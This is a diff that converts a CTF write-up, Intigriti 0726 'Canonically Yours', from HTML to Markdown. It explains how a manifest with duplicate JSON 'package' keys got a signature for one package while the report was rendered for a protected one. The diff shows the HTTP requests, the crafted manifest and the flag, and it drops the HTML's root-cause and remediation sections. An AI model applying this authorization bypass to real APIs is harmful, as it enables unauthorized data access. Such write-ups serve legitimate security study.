@@ -1,174 +1,99 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="Intigriti 0726: Canonically Yours — a Registry Observatory CTF write-up." />
-    <title>Intigriti 0726 — Canonically Yours</title>
-    <style>
-      :root {
-        --page: #0b1020;
-        --panel: #121a2e;
-        --panel-2: #18223a;
-        --line: #2a3857;
-        --text: #e9edf7;
-        --muted: #a9b5cc;
-        --accent: #7dd3fc;
-        --accent-2: #a78bfa;
-        --code: #09101f;
-        --success: #86efac;
-      }
+---
+layout: default
+title: Intigriti 0726 — Canonically Yours
+---
 
-      * { box-sizing: border-box; }
-      html { scroll-behavior: smooth; }
-      body {
-        margin: 0;
-        background: radial-gradient(circle at 10% 0%, #172554 0, var(--page) 36rem);
-        color: var(--text);
-        font: 16px/1.65 ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      }
-      a { color: var(--accent); }
-      a:hover { color: #bae6fd; }
-      code, pre { font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace; }
-      code {
-        padding: .12rem .35rem;
-        border-radius: .3rem;
-        color: #dbeafe;
-        background: #1e293b;
-      }
-      pre {
-        overflow-x: auto;
-        padding: 1.1rem 1.2rem;
-        border: 1px solid var(--line);
-        border-radius: .7rem;
-        background: var(--code);
-        color: #dbeafe;
-        line-height: 1.55;
-      }
-      pre code { padding: 0; background: transparent; }
-      .container { width: min(1100px, calc(100% - 2.5rem)); margin: 0 auto; }
-      .hero { padding: 5.5rem 0 3.5rem; border-bottom: 1px solid var(--line); }
-      .eyebrow { margin: 0 0 .75rem; color: var(--accent); font-weight: 700; letter-spacing: .08em; text-transform: uppercase; font-size: .78rem; }
-      h1, h2, h3 { line-height: 1.2; color: #fff; }
-      h1 { max-width: 850px; margin: 0; font-size: clamp(2.25rem, 6vw, 4.65rem); letter-spacing: -.055em; }
-      h2 { margin: 0 0 1rem; padding-top: .2rem; font-size: clamp(1.45rem, 3vw, 2rem); letter-spacing: -.025em; }
-      h3 { margin: 1.4rem 0 .5rem; font-size: 1.1rem; }
-      .lead { max-width: 720px; margin: 1.3rem 0 0; color: #cbd5e1; font-size: 1.18rem; }
-      .chips { display: flex; flex-wrap: wrap; gap: .55rem; margin-top: 1.6rem; }
-      .chip { padding: .32rem .65rem; border: 1px solid #3b4d73; border-radius: 999px; color: #c4d5ef; background: rgba(15, 23, 42, .65); font-size: .88rem; }
-      .layout { display: grid; grid-template-columns: 220px minmax(0, 1fr); gap: 3.2rem; padding: 3.3rem 0 5rem; }
-      .toc { position: sticky; top: 1.2rem; height: fit-content; padding: 1rem; border: 1px solid var(--line); border-radius: .75rem; background: rgba(18, 26, 46, .72); }
-      .toc strong { display: block; margin-bottom: .55rem; font-size: .85rem; letter-spacing: .05em; text-transform: uppercase; color: var(--muted); }
-      .toc a { display: block; padding: .28rem .25rem; text-decoration: none; color: #cbd5e1; font-size: .88rem; }
-      .toc a:hover { color: var(--accent); }
-      article > section { margin-bottom: 3.4rem; scroll-margin-top: 1rem; }
-      .callout { margin: 1.25rem 0; padding: 1rem 1.15rem; border-left: 3px solid var(--accent-2); border-radius: .25rem .6rem .6rem .25rem; background: rgba(124, 58, 237, .11); color: #ddd6fe; }
-      .image { margin: 1.4rem 0; padding: .55rem; border: 1px solid var(--line); border-radius: .75rem; background: var(--panel); }
-      .image img { display: block; width: 100%; height: auto; border-radius: .4rem; }
-      .image figcaption { padding: .55rem .35rem .1rem; color: var(--muted); font-size: .85rem; }
-      .table-wrap { overflow-x: auto; }
-      table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--line); border-radius: .7rem; overflow: hidden; }
-      th, td { padding: .75rem .9rem; border-bottom: 1px solid var(--line); text-align: left; vertical-align: top; }
-      th { color: #dbeafe; background: var(--panel-2); }
-      tr:last-child td { border-bottom: 0; }
-      .flag { padding: 1.2rem; border: 1px solid #276749; border-radius: .7rem; background: rgba(22, 101, 52, .18); }
-      .flag code { color: var(--success); background: transparent; font-size: 1.02rem; word-break: break-word; }
-      footer { padding: 2rem 0; border-top: 1px solid var(--line); color: var(--muted); font-size: .9rem; }
-      @media (max-width: 800px) {
-        .hero { padding-top: 3.7rem; }
-        .layout { display: block; padding-top: 2rem; }
-        .toc { position: static; margin-bottom: 2.5rem; }
-      }
-    </style>
-  </head>
-  <body>
-    <header class="hero">
-      <div class="container">
-        <p class="eyebrow">Intigriti CTF · Web</p>
-        <h1>0726 — Canonically Yours</h1>
-        <p class="lead">A duplicate JSON-key parser differential caused authorization to validate one package while report rendering used another, exposing a protected Registry Observatory report.</p>
-        <div class="chips" aria-label="Challenge details">
-          <span class="chip">Target: challenge-0726.intigriti.io</span>
-          <span class="chip">Duplicate JSON keys</span>
-          <span class="chip">Broken access control</span>
-        </div>
-      </div>
-    </header>
+# Intigriti 0726 — Canonically Yours
 
-    <main class="container layout">
-      <nav class="toc" aria-label="Table of contents">
-        <strong>On this page</strong>
-        <a href="#overview">Overview</a>
-        <a href="#step-1">1. Account</a>
-        <a href="#step-2">2. Namespace &amp; CSRF</a>
-        <a href="#step-3">3. Target package</a>
-        <a href="#step-4">4. Workflow</a>
-        <a href="#step-5">5. Duplicate-key manifest</a>
-        <a href="#step-6">6. Approval</a>
-        <a href="#step-7">7. Publication</a>
-        <a href="#step-8">8. Protected report</a>
-        <a href="#root-cause">Root cause</a>
-        <a href="#remediation">Remediation</a>
-      </nav>
+Write-up for the Registry Observatory challenge.
 
-      <article>
-        <section id="overview">
-          <h2>Challenge information</h2>
-          <div class="table-wrap"><table>
-            <tr><th>Challenge</th><td>Canonically Yours</td></tr>
-            <tr><th>Platform</th><td>Intigriti</td></tr>
-            <tr><th>Category</th><td>Web / API security</td></tr>
-            <tr><th>Vulnerability</th><td>Duplicate JSON-key parser differential</td></tr>
-            <tr><th>Impact</th><td>Broken access control and protected-report disclosure</td></tr>
-          </table></div>
-          <p>Registry Observatory generates signed compatibility reports for software packages. The objective was to retrieve a protected report without modifying registry data or attacking the underlying infrastructure.</p>
-        </section>
+## Challenge information
 
-        <section id="step-1">
-          <h2>Step 1 — Create an account</h2>
-          <p>I created a normal account on the challenge website. The application assigned a unique private namespace to the account.</p>
-          <figure class="image"><img src="assets/screenshots/01-registration.png" alt="Registry Observatory registration page" loading="lazy" /><figcaption>Registry Observatory registration page</figcaption></figure>
-        </section>
+- Target: `https://challenge-0726.intigriti.io`
+- Category: Web
+- Vulnerability: Duplicate JSON-key parser differential
+- Impact: Broken access control and protected-report disclosure
 
-        <section id="step-2">
-          <h2>Step 2 — Obtain the namespace and CSRF token</h2>
-          <p>After logging in, I inspected the authenticated request below.</p>
-          <pre><code>GET /api/me HTTP/2
-Host: challenge-0726.intigriti.io</code></pre>
-          <p>The response contains the assigned private namespace and a CSRF token required for protected POST requests.</p>
-          <pre><code>{
+## Step 1 - Create an account
+
+I created a normal account on the challenge website. The application assigned a unique private namespace to the account.
+
+![](screenshots/01-registration.png)
+
+---
+
+## Step 2 - Obtain the namespace and CSRF token
+
+After logging in, I inspected the authenticated API request below:
+
+```http
+GET /api/me HTTP/2
+Host: challenge-0726.intigriti.io
+```
+
+The response contains the assigned private namespace and a CSRF token required for protected POST requests.
+
+```json
+{
   "user": {
     "username": "REDACTED",
     "namespace": "YOUR_NAMESPACE"
   },
   "csrf_token": "REDACTED"
-}</code></pre>
-          <figure class="image"><img src="assets/screenshots/02-api-me.png" alt="Namespace and CSRF token returned by the API" loading="lazy" /><figcaption>Namespace and CSRF token returned by the API</figcaption></figure>
-        </section>
+}
+```
 
-        <section id="step-3">
-          <h2>Step 3 — Identify the protected package</h2>
-          <p>The Observatory Archive contains package transfer records, component details, and version references. The records identify the protected target:</p>
-          <pre><code>Namespace: core
+![](screenshots/02-api-me.png)
+
+---
+
+## Step 3 - Identify the protected package
+
+The Observatory Archive contains package transfer records, component details, and version references.
+
+The records identify the protected target:
+
+```text
+Namespace: core
 Package: security-notes
-Version: 1.0.0</code></pre>
-          <p>Therefore, the protected report belongs to <code>@core/security-notes@1.0.0</code>.</p>
-          <figure class="image"><img src="assets/screenshots/03-observatory-target.png" alt="Observatory Archive containing the target package details" loading="lazy" /><figcaption>Observatory Archive package records</figcaption></figure>
-        </section>
+Version: 1.0.0
+```
 
-        <section id="step-4">
-          <h2>Step 4 — Understand the normal manifest workflow</h2>
-          <p>The Manifest Studio lets a user create a manifest, request a time-limited approval, and run a read-only preflight report. A normal report for the owned <code>legacy-adapter</code> package revealed the following hint:</p>
-          <pre><code>Historical ingestion retains the initial package declaration;
-report rendering uses reconstructed manifest data.</code></pre>
-          <p>This indicated that different components might interpret the manifest differently.</p>
-          <figure class="image"><img src="assets/screenshots/04-normal-approval.png" alt="Normal manifest workflow and hint" loading="lazy" /><figcaption>Normal manifest workflow and the parser-differential hint</figcaption></figure>
-        </section>
+Therefore, the protected report belongs to:
 
-        <section id="step-5">
-          <h2>Step 5 — Create a duplicate-key manifest</h2>
-          <p>I intercepted the <code>/api/manifests/sign</code> request in Burp Suite and created a raw JSON manifest with two top-level properties named <code>package</code>. Replace <code>YOUR_NAMESPACE</code> with the namespace returned by <code>/api/me</code>.</p>
-          <pre><code>{
+```text
+@core/security-notes@1.0.0
+```
+
+![](screenshots/03-observatory-target.png)
+
+---
+
+## Step 4 - Understand the normal manifest workflow
+
+The Manifest Studio lets a user create a manifest, request a time-limited approval, and run a read-only preflight report.
+
+A normal report for the owned `legacy-adapter` package revealed this hint:
+
+```text
+Historical ingestion retains the initial package declaration;
+report rendering uses reconstructed manifest data.
+```
+
+This indicated that different components might interpret the manifest differently.
+
+![](screenshots/04-normal-approval.png)
+
+---
+
+## Step 5 - Intercept Request in Burpsuite find the endpoint named `/api/manifests/sign` and create a duplicate-key manifest
+
+I created a raw JSON manifest with two top-level properties named `package`.
+
+Replace `YOUR_NAMESPACE` with the namespace returned by `/api/me`.
+
+```json
+{
   "package": {
     "scope": "YOUR_NAMESPACE",
     "name": "legacy-adapter",
@@ -184,17 +109,35 @@ report rendering uses reconstructed manifest data.</code></pre>
     "visibility": "private"
   },
   "operation": "preflight"
-}</code></pre>
-          <p>The first package belongs to the current account, <code>@YOUR_NAMESPACE/legacy-adapter</code>. The later declaration references <code>@core/security-notes</code>.</p>
-          <div class="callout"><strong>Important:</strong> I Base64-encoded the exact raw JSON without formatting it. Many JSON formatters silently remove duplicate object keys, which breaks the proof of concept.</div>
-          <figure class="image"><img src="assets/screenshots/05-duplicate-manifest.png" alt="Raw duplicate-key JSON manifest" loading="lazy" /><figcaption>Raw manifest containing duplicate <code>package</code> keys</figcaption></figure>
-          <figure class="image"><img src="assets/screenshots/06-signing-request-redacted.png" alt="Burp Suite request to sign the duplicate-key manifest and the successful approval response" loading="lazy" /><figcaption>Signing the exact Base64-encoded manifest in Burp Suite (session and CSRF values redacted)</figcaption></figure>
-        </section>
+}
+```
 
-        <section id="step-6">
-          <h2>Step 6 — Request manifest approval</h2>
-          <p>I sent the Base64-encoded manifest to the signing endpoint:</p>
-          <pre><code>POST /api/manifests/sign HTTP/2
+The first package belongs to the current account:
+
+```text
+@YOUR_NAMESPACE/legacy-adapter
+```
+
+The second package references the protected target:
+
+```text
+@core/security-notes
+```
+
+![](screenshots/05-duplicate-manifest.png)
+
+![](screenshots/06-signing-request-redacted.png)
+
+I Base64-encoded the exact raw JSON without formatting it. JSON formatters can remove duplicate object keys, which would break the proof of concept.
+
+---
+
+## Step 6 - Request manifest approval
+
+I sent the Base64-encoded manifest to the signing endpoint:
+
+```http
+POST /api/manifests/sign HTTP/2
 Host: challenge-0726.intigriti.io
 Content-Type: application/json
 X-Csrf-Token: REDACTED
@@ -202,15 +145,23 @@ Cookie: REDACTED
 
 {
   "manifest_b64": "BASE64_ENCODED_DUPLICATE_KEY_MANIFEST"
-}</code></pre>
-          <p>The application accepted the manifest and returned a valid approval.</p>
-          <figure class="image"><img src="assets/screenshots/06-sign-approval.png" alt="Successful manifest signing response" loading="lazy" /><figcaption>Successful signing response</figcaption></figure>
-        </section>
+}
+```
 
-        <section id="step-7">
-          <h2>Step 7 — Publish the exact same signed manifest</h2>
-          <p>I submitted the same Base64 manifest and approval fields to <code>/api/publications</code>. The request must include the CSRF token and <code>Content-Type: application/json</code>.</p>
-          <pre><code>POST /api/publications HTTP/2
+The application accepted the manifest and returned a valid approval.
+
+![](screenshots/06-sign-approval.png)
+
+---
+
+## Step 7 - Publish the exact same signed manifest
+
+I added and sent the exact same Base64 manifest and the approval fields to:
+
+**Note:** Add the CSRF token and `Content-Type: application/json`.
+
+```http
+POST /api/publications HTTP/2
 Host: challenge-0726.intigriti.io
 Content-Type: application/json
 X-Csrf-Token: REDACTED
@@ -223,44 +174,37 @@ Cookie: REDACTED
   "nonce": "REDACTED",
   "expires_at": 0,
   "signature": "REDACTED"
-}</code></pre>
-          <p>The server created a ready publication and returned a publication ID.</p>
-          <figure class="image"><img src="assets/screenshots/07-publication-created.png" alt="Successful publication response" loading="lazy" /><figcaption>Publication created successfully</figcaption></figure>
-        </section>
+}
+```
 
-        <section id="step-8">
-          <h2>Step 8 — Retrieve the protected report</h2>
-          <p>I requested the generated report:</p>
-          <pre><code>GET /api/publications/PUBLICATION_ID HTTP/2
+The server created a ready publication and returned a publication ID.
+
+![](screenshots/07-publication-created.png)
+
+---
+
+## Step 8 - Retrieve the protected report
+
+I requested the generated report:
+
+```http
+GET /api/publications/PUBLICATION_ID HTTP/2
 Host: challenge-0726.intigriti.io
-Cookie: REDACTED</code></pre>
-          <p>The report was generated for the protected package <code>@core/security-notes@1.0.0</code>.</p>
-          <figure class="image"><img src="assets/screenshots/08-protected-report.png" alt="Protected report containing the flag" loading="lazy" /><figcaption>Protected report disclosure</figcaption></figure>
-          <div class="flag"><strong>Flag</strong><br /><code>INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}</code></div>
-        </section>
+Cookie: REDACTED
+```
 
-        <section id="root-cause">
-          <h2>Root cause and impact</h2>
-          <p>The approval service and report-generation service interpret duplicate JSON keys differently. The raw manifest bytes never change, so its SHA-256 digest and signature remain valid, but the authorization decision and report target refer to different package declarations.</p>
-          <div class="table-wrap"><table>
-            <tr><th>Component</th><th>Package interpreted</th></tr>
-            <tr><td>Manifest approval service</td><td>First <code>package</code> object: owned <code>legacy-adapter</code> package</td></tr>
-            <tr><td>Report generation service</td><td>Later <code>package</code> object: protected <code>core/security-notes</code> package</td></tr>
-          </table></div>
-          <p>As a result, any authenticated user could bypass the namespace authorization boundary and read a protected report for a platform-maintained package.</p>
-        </section>
+The report was generated for the protected package:
 
-        <section id="remediation">
-          <h2>Remediation</h2>
-          <ol>
-            <li>Reject JSON documents containing duplicate member names at the API boundary.</li>
-            <li>Parse the manifest once and use the same canonical object for authorization, signing, and rendering.</li>
-            <li>Sign a canonical serialization of the validated manifest, not opaque bytes that downstream components reparse.</li>
-            <li>Add tests that verify every consumer agrees on security-relevant fields.</li>
-          </ol>
-        </section>
-      </article>
-    </main>
-    <footer><div class="container">Intigriti 0726 — Canonically Yours · CTF write-up</div></footer>
-  </body>
-</html>
+```text
+@core/security-notes@1.0.0
+```
+
+![](screenshots/08-protected-report.png)
+
+---
+
+# Flag
+
+```text
+INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}
+```
